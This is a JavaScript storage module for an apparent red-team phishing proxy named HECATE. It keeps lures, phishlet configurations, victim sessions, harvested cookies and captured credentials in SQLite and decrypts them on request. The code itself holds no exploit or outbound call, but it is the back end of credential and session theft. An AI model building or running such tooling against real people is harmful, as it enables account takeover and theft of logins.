'use strict';

/**
 * HECATE Evil Proxy — Storage
 * SQLite persistence for harvested sessions and captured material.
 * Sensitive values (cookie values, credentials) are stored AES-256-GCM
 * encrypted via the core KeyManager — never plaintext at rest.
 */

const { randomUUID } = require('crypto');
const engagementIntegrity = require('../../../core/db/engagement-integrity');

let db         = null;
let KeyManager = null;

const SCHEMA = `
  CREATE TABLE IF NOT EXISTS ep_sessions (
    id              TEXT PRIMARY KEY,
    lure_id         TEXT NOT NULL,
    victim_sid      TEXT NOT NULL,
    engagement_id   TEXT NOT NULL,
    phishlet_name   TEXT NOT NULL,
    state           TEXT NOT NULL DEFAULT 'active',
    ip              TEXT,
    user_agent      TEXT,
    visited_urls    TEXT DEFAULT '[]',
    created_at      TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
    last_seen_at    TEXT,
    harvested_at    TEXT,
    UNIQUE(lure_id, victim_sid)
  );

  CREATE TABLE IF NOT EXISTS ep_cookies (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL,
    name        TEXT NOT NULL,
    value_enc   TEXT NOT NULL,
    domain      TEXT,
    path        TEXT DEFAULT '/',
    secure      INTEGER DEFAULT 1,
    http_only   INTEGER DEFAULT 0,
    captured_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
    FOREIGN KEY (session_id) REFERENCES ep_sessions(id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS ep_credentials (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL,
    field_key   TEXT NOT NULL,
    value_enc   TEXT NOT NULL,
    captured_at TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
    FOREIGN KEY (session_id) REFERENCES ep_sessions(id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS ep_lures (
    id              TEXT PRIMARY KEY,
    engagement_id   TEXT NOT NULL,
    phishlet_name   TEXT NOT NULL,
    phish_domain    TEXT NOT NULL,
    phishlet_json   TEXT NOT NULL,
    active          INTEGER DEFAULT 1,
    created_at      TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now'))
  );

  CREATE INDEX IF NOT EXISTS idx_ep_sessions_lure ON ep_sessions(lure_id);
  CREATE INDEX IF NOT EXISTS idx_ep_sessions_eid  ON ep_sessions(engagement_id);
  CREATE INDEX IF NOT EXISTS idx_ep_sessions_state ON ep_sessions(state);
  CREATE INDEX IF NOT EXISTS idx_ep_cookies_sess  ON ep_cookies(session_id);
  CREATE INDEX IF NOT EXISTS idx_ep_creds_sess    ON ep_credentials(session_id);
`;

function init(database, keyManager) {
  db         = database;
  KeyManager = keyManager;
  db.exec(SCHEMA);
  engagementIntegrity.install(db, ['ep_sessions','ep_lures']);
}

// ── Lures ─────────────────────────────────────────────────────────────────────

function saveLure(lure) {
  db.prepare(`
    INSERT OR REPLACE INTO ep_lures
      (id, engagement_id, phishlet_name, phish_domain, phishlet_json, active)
    VALUES (?,?,?,?,?,?)
  `).run(lure.id, lure.engagementId, lure.phishletName,
         lure.phishDomain, JSON.stringify(lure.phishlet), lure.active ? 1 : 0);
}

function getLureRecord(id) {
  const row = db.prepare(`SELECT * FROM ep_lures WHERE id=?`).get(id);
  if (!row) return null;
  return { ...row, phishlet: JSON.parse(row.phishlet_json), active: !!row.active };
}

function listLureRecords(engagementId) {
  const rows = engagementId
    ? db.prepare(`SELECT * FROM ep_lures WHERE engagement_id=? ORDER BY created_at DESC`).all(engagementId)
    : db.prepare(`SELECT * FROM ep_lures ORDER BY created_at DESC`).all();
  return rows.map(r => ({ ...r, phishlet: JSON.parse(r.phishlet_json), active: !!r.active }));
}

// ── Sessions ──────────────────────────────────────────────────────────────────

function upsertSession(session) {
  db.prepare(`
    INSERT INTO ep_sessions
      (id, lure_id, victim_sid, engagement_id, phishlet_name, state, ip, user_agent,
       visited_urls, last_seen_at, harvested_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?)
    ON CONFLICT(lure_id, victim_sid) DO UPDATE SET
      state        = excluded.state,
      last_seen_at = excluded.last_seen_at,
      harvested_at = excluded.harvested_at,
      visited_urls = excluded.visited_urls,
      ip           = excluded.ip,
      user_agent   = excluded.user_agent
  `).run(
    randomUUID(),
    session.lureId, session.victimSid, session.engagementId,
    session.phishletName, session.state,
    session.ip ?? null, session.userAgent ?? null,
    JSON.stringify(session.visitedUrls ?? []),
    new Date(session.lastSeen).toISOString(),
    session.harvestedAt ? new Date(session.harvestedAt).toISOString() : null,
  );
  return db.prepare(`SELECT id FROM ep_sessions WHERE lure_id=? AND victim_sid=?`)
           .get(session.lureId, session.victimSid)?.id;
}

function getSessionRecord(lureId, victimSid) {
  return db.prepare(`SELECT * FROM ep_sessions WHERE lure_id=? AND victim_sid=?`).get(lureId, victimSid);
}

function listSessionRecords({ engagementId, state, lureId } = {}) {
  let sql  = `SELECT * FROM ep_sessions WHERE 1=1`;
  const args = [];
  if (engagementId) { sql += ` AND engagement_id=?`; args.push(engagementId); }
  if (state)        { sql += ` AND state=?`;          args.push(state); }
  if (lureId)       { sql += ` AND lure_id=?`;        args.push(lureId); }
  sql += ` ORDER BY created_at DESC`;
  return db.prepare(sql).all(...args);
}

// ── Cookies ───────────────────────────────────────────────────────────────────

async function saveCookies(sessionDbId, cookies) {
  const stmt = db.prepare(`
    INSERT OR IGNORE INTO ep_cookies (id, session_id, name, value_enc, domain, path, secure, http_only)
    VALUES (?,?,?,?,?,?,?,?)
  `);

  for (const c of cookies) {
    const encrypted = await KeyManager.encrypt(c.value);
    stmt.run(randomUUID(), sessionDbId, c.name, encrypted,
             c.domain ?? null, c.path ?? '/', c.secure ? 1 : 0, c.httpOnly ? 1 : 0);
  }
}

async function getCookies(sessionDbId) {
  const rows = db.prepare(`SELECT * FROM ep_cookies WHERE session_id=? ORDER BY captured_at ASC`).all(sessionDbId);
  const out  = [];
  for (const r of rows) {
    const value = await KeyManager.decrypt(r.value_enc);
    out.push({ name: r.name, value, domain: r.domain, path: r.path, capturedAt: r.captured_at });
  }
  return out;
}

// ── Credentials ───────────────────────────────────────────────────────────────

async function saveCredentials(sessionDbId, credentials) {
  const stmt = db.prepare(`
    INSERT OR IGNORE INTO ep_credentials (id, session_id, field_key, value_enc)
    VALUES (?,?,?,?)
  `);

  for (const [key, value] of Object.entries(credentials)) {
    const encrypted = await KeyManager.encrypt(String(value));
    stmt.run(randomUUID(), sessionDbId, key, encrypted);
  }
}

async function getCredentials(sessionDbId) {
  const rows = db.prepare(`SELECT * FROM ep_credentials WHERE session_id=? ORDER BY captured_at ASC`).all(sessionDbId);
  const out  = {};
  for (const r of rows) {
    out[r.field_key] = await KeyManager.decrypt(r.value_enc);
  }
  return out;
}

// ── Stats ─────────────────────────────────────────────────────────────────────

function stats(engagementId) {
  const where = engagementId ? ' WHERE engagement_id=?' : '';
  const args = engagementId ? [engagementId] : [];
  const total = db.prepare(`SELECT COUNT(*) as n FROM ep_sessions${where}`).get(...args)?.n ?? 0;
  const harvested = db.prepare(`SELECT COUNT(*) as n FROM ep_sessions${engagementId ? ' WHERE engagement_id=? AND state=?' : ' WHERE state=?'}`).get(...(engagementId ? [engagementId, 'harvested'] : ['harvested']))?.n ?? 0;
  const byState = db.prepare(`SELECT state, COUNT(*) as n FROM ep_sessions${where} GROUP BY state`).all(...args);
  return { total, harvested, byState };
}

module.exports = {
  init,
  saveLure, getLureRecord, listLureRecords,
  upsertSession, getSessionRecord, listSessionRecords,
  saveCookies, getCookies,
  saveCredentials, getCredentials,
  stats,
};
